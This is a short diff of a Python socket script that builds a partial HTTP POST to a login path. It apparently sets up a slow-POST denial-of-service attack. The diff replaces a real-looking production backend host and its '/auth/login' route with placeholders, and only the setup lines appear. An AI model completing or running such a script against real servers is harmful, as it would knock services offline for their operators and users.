@@ -1,8 +1,8 @@
 import socket
 import time
-SERVER_IP = "travelas-backend-production.up.railway.app"
+SERVER_IP = "[IP]"
 SERVER_PORT = 80
-PATH = "/auth/login"
+PATH = "[rooute]"
 PARTIAL_POST_DATA = b"nom=valeur&"  # Encodage en bytes pour l'envoi réseau
 
 PARTIAL_POST_HEADERS = f"POST {PATH} HTTP/1.1\r\nHost: {SERVER_IP}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".encode('utf-8')
